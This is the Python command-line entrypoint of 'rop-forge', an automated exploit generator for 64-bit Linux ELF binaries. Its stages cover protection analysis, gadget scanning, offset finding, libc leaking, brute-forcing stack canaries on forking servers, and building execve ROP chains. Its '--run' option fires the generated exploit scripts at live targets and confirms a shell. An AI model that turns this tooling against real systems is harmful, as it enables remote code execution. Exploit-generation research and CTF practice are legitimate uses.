"""Command-line entrypoint for rop-forge."""

from __future__ import annotations

import argparse
import subprocess
import sys
import tempfile
import time
from pathlib import Path

from rop_forge.analyzer import Protections, analyze_protections
from rop_forge.gadgets import GadgetDatabase, GadgetKind, scan_gadgets

# offset/chainer/leak/canary/exploit all transitively need pwntools (the
# `rop-forge[live]` extra) — analyzer/gadgets are the only stages that work
# with just the base install. Import lazily so `--stage analyzer`/`--stage
# gadgets` (and --help) work without it, and give every other stage a clear
# message instead of a raw ModuleNotFoundError.
try:
    from rop_forge.canary import CanaryNotFoundError, build_canary_execve_chain, crack_canary, verify_canary_shell
    from rop_forge.chainer import (
        Chain,
        ChainNotFoundError,
        build_execve_chain,
        build_leaked_execve_chain,
        find_system_libc,
        verify_leaked_shell,
        verify_shell,
    )
    from rop_forge.exploit import emit_replay_script, emit_solver_script
    from rop_forge.leak import ForkingServer, LeakError, probe
    from rop_forge.offset import OffsetNotFoundError, find_offset

    _LIVE_IMPORT_ERROR: ModuleNotFoundError | None = None
except ModuleNotFoundError as exc:
    _LIVE_IMPORT_ERROR = exc

    class OffsetNotFoundError(Exception):
        pass

    class ChainNotFoundError(Exception):
        pass

    class LeakError(Exception):
        pass

    class CanaryNotFoundError(Exception):
        pass

_EXAMPLES_PER_KIND = 5
_REPLAY_RUN_STARTUP = 3.0  # aslr=False, local process() — fast to reach ready-for-input
_SOLVER_RUN_STARTUP = 45.0  # includes a fresh canary crack + libc leak inside the subprocess itself

STAGES = ["analyzer", "gadgets", "offset", "chainer", "leak", "canary", "exploit"]
_LIVE_STAGES = {"offset", "chainer", "leak", "canary", "exploit"}


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="rop-forge",
        description="Automatically generate a ROP-chain exploit for a 64-bit Linux ELF binary.",
    )
    parser.add_argument("binary", help="path to the target ELF binary")
    parser.add_argument("--libc", help="path to the target's libc, if known", default=None)
    parser.add_argument(
        "--run", action="store_true", help="execute the generated exploit against the live target"
    )
    parser.add_argument(
        "--server",
        default=None,
        help=(
            "path to a forking-server variant of the target (see "
            "fixtures/src/server_main.c) — for PIE/ASLR targets, switches "
            "--stage chainer to the leak-based flow: probes this server for "
            "the overflow offset and libc's real runtime base, then builds/"
            "verifies the chain against it, instead of the aslr=False "
            "stand-in build_execve_chain() uses. If the target (per "
            "--stage analyzer) also has a stack canary, --stage chainer "
            "additionally cracks it first (see --stage canary) before "
            "probing — same forking server either way. (--stage leak/canary "
            "always take a server binary directly as their positional "
            "`binary` argument.)"
        ),
    )
    parser.add_argument(
        "--stage",
        choices=STAGES,
        default=None,
        help=(
            "run a single pipeline stage standalone and print its output, "
            "instead of the full pipeline (debugging/introspection; each "
            "stage wraps the same module function the full pipeline uses)"
        ),
    )
    parser.add_argument(
        "--output",
        default=None,
        help=(
            "--stage exploit only: write the generated standalone script "
            "here instead of printing it to stdout"
        ),
    )
    return parser


def _print_protections(protections: Protections) -> None:
    print(f"NX:     {'enabled' if protections.nx else 'disabled'}")
    print(f"PIE:    {'enabled' if protections.pie else 'disabled'}")
    print(f"Canary: {'enabled' if protections.canary else 'disabled'}")
    print(f"RELRO:  {protections.relro.value}")


def _run_analyzer(args: argparse.Namespace) -> int:
    _print_protections(analyze_protections(args.binary))
    return 0


def _print_gadgets(db: GadgetDatabase) -> None:
    print(f"Found {len(db)} gadgets")
    for kind in GadgetKind:
        matches = db.by_kind(kind)
        if not matches:
            continue
        print(f"\n{kind.value} ({len(matches)}):")
        for gadget in matches[:_EXAMPLES_PER_KIND]:
            print(f"  {gadget}")
        if len(matches) > _EXAMPLES_PER_KIND:
            print(f"  ... and {len(matches) - _EXAMPLES_PER_KIND} more")


def _run_gadgets(args: argparse.Namespace) -> int:
    _print_gadgets(scan_gadgets(args.binary))
    return 0


def _run_offset(args: argparse.Namespace) -> int:
    offset = find_offset(args.binary)
    print(f"Offset to return address: {offset} bytes")
    return 0


def _print_chain(chain: Chain) -> None:
    print(f"Chain ({len(chain)} elements, {len(chain.payload())} payload bytes):")
    print(chain)


def _resolve_libc(args: argparse.Namespace) -> str:
    libc_path = args.libc or find_system_libc()
    if libc_path is None:
        raise ChainNotFoundError("no libc available and none found at standard system paths")
    return str(libc_path)


def _print_shell_result(ok: bool) -> int:
    print()
    print("Shell verified — got real command execution" if ok else "Shell verification failed")
    return 0 if ok else 4


def _run_chainer(args: argparse.Namespace) -> int:
    if args.server:
        libc_path = _resolve_libc(args)
        with ForkingServer(args.server) as server:
            if analyze_protections(args.binary).canary:
                result = build_canary_execve_chain(server, libc_path)
                _print_chain(result.chain)
                if args.run:
                    return _print_shell_result(verify_canary_shell(server, result.header, result.chain))
                return 0

            result = build_leaked_execve_chain(server, libc_path)
            _print_chain(result.chain)
            if args.run:
                return _print_shell_result(
                    verify_leaked_shell(server, result.chain, result.offset)
                )
        return 0

    chain = build_execve_chain(args.binary, libc_path=args.libc)
    _print_chain(chain)
    if args.run:
        offset = find_offset(args.binary)
        return _print_shell_result(verify_shell(args.binary, chain, offset))
    return 0


def _run_leak(args: argparse.Namespace) -> int:
    with ForkingServer(args.binary) as server:
        result = probe(server, _resolve_libc(args))
    print(f"Offset to return address: {result.offset} bytes")
    print(f"Libc runtime base: 0x{result.libc_base:x}")
    return 0


def _run_canary(args: argparse.Namespace) -> int:
    with ForkingServer(args.binary) as server:
        result = crack_canary(server)
    print(f"Offset to canary: {result.offset} bytes")
    print(f"Canary: {result.canary.hex()}")
    return 0


def _run_exploit(args: argparse.Namespace) -> int:
    if args.server:
        libc_path = _resolve_libc(args)
        with ForkingServer(args.server) as server:
            if analyze_protections(args.binary).canary:
                result = build_canary_execve_chain(server, libc_path)
            else:
                result = build_leaked_execve_chain(server, libc_path)
        script = emit_solver_script(
            args.server,
            libc_path,
            result.chain,
            result.offset,
            result.libc_base,
            canary_offset=result.canary_offset,
        )
        startup = _SOLVER_RUN_STARTUP
    else:
        chain = build_execve_chain(args.binary, libc_path=args.libc)
        offset = find_offset(args.binary)
        script = emit_replay_script(args.binary, offset, chain)
        startup = _REPLAY_RUN_STARTUP

    output_path = Path(args.output) if args.output else None
    if output_path:
        output_path.write_text(script)
        print(f"Exploit script written to {output_path}")
    else:
        print(script)

    if not args.run:
        return 0

    script_path, is_temp = (output_path, False) if output_path else (_write_temp_script(script), True)
    try:
        ok = _run_emitted_script(script_path, startup)
    finally:
        if is_temp:
            script_path.unlink(missing_ok=True)
    print()
    print(
        "Emitted script verified — got real command execution"
        if ok
        else "Emitted script verification failed"
    )
    return 0 if ok else 4


def _write_temp_script(script: str) -> Path:
    fd, path = tempfile.mkstemp(suffix=".py", prefix="rop_forge_exploit_")
    with open(fd, "w") as f:
        f.write(script)
    return Path(path)


def _run_emitted_script(script_path: Path, startup: float) -> bool:
    """Executes the emitted script as a genuinely separate process (proving
    the standalone artifact itself works, not just rop_forge's in-memory
    chain) and checks for `id`'s own "uid=" output — same proof-of-shell
    standard as verify_shell()/verify_leaked_shell()/verify_canary_shell()."""
    proc = subprocess.Popen(
        [sys.executable, str(script_path)],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )
    time.sleep(startup)
    if proc.poll() is not None:
        proc.stdout.read()
        return False
    try:
        proc.stdin.write(b"id\n")
        proc.stdin.flush()
    except BrokenPipeError:
        pass
    time.sleep(1.0)
    proc.terminate()
    try:
        out, _ = proc.communicate(timeout=3)
    except subprocess.TimeoutExpired:
        proc.kill()
        out, _ = proc.communicate()
    return b"uid=" in out


STAGE_RUNNERS = {
    "analyzer": _run_analyzer,
    "gadgets": _run_gadgets,
    "offset": _run_offset,
    "chainer": _run_chainer,
    "leak": _run_leak,
    "canary": _run_canary,
    "exploit": _run_exploit,
}


def _run_full_pipeline(args: argparse.Namespace) -> int:
    for stage_runner in (_run_analyzer, _run_gadgets, _run_offset):
        exit_code = stage_runner(args)
        if exit_code != 0:
            return exit_code
    # chainer/leak/canary/exploit are deliberately NOT part of the default
    # pipeline — the libc gadget scan alone costs ~80s, a real UX cost for
    # every invocation including quick debugging use (see CONTEXT.md).
    # They're full, working stages, just opt-in.
    print()
    print("rop-forge: run with --stage exploit (add --run to verify live) for a full exploit")
    return 0


def main(argv: list[str] | None = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)

    # the full pipeline includes offset, so it needs live deps too — only
    # `--stage analyzer`/`--stage gadgets` work on the base install.
    needs_live = args.stage is None or args.stage in _LIVE_STAGES
    if needs_live and _LIVE_IMPORT_ERROR is not None:
        stage_desc = f"--stage {args.stage}" if args.stage else "the full pipeline"
        print(
            f"rop-forge: {stage_desc} requires the 'live' extra (missing module "
            f"'{_LIVE_IMPORT_ERROR.name}') — install with `pip install rop-forge[live]` "
            "(or `uv sync --extra live` in this repo). "
            "--stage analyzer/--stage gadgets work without it.",
            file=sys.stderr,
        )
        return 5

    runner = STAGE_RUNNERS[args.stage] if args.stage else _run_full_pipeline
    try:
        return runner(args)
    except (FileNotFoundError, IsADirectoryError) as exc:
        print(f"rop-forge: cannot read binary '{args.binary}': {exc}", file=sys.stderr)
        return 2
    except OffsetNotFoundError as exc:
        print(f"rop-forge: {exc}", file=sys.stderr)
        return 3
    except ChainNotFoundError as exc:
        print(f"rop-forge: {exc}", file=sys.stderr)
        return 3
    except LeakError as exc:
        print(f"rop-forge: {exc}", file=sys.stderr)
        return 3
    except CanaryNotFoundError as exc:
        print(f"rop-forge: {exc}", file=sys.stderr)
        return 3


if __name__ == "__main__":
    raise SystemExit(main())
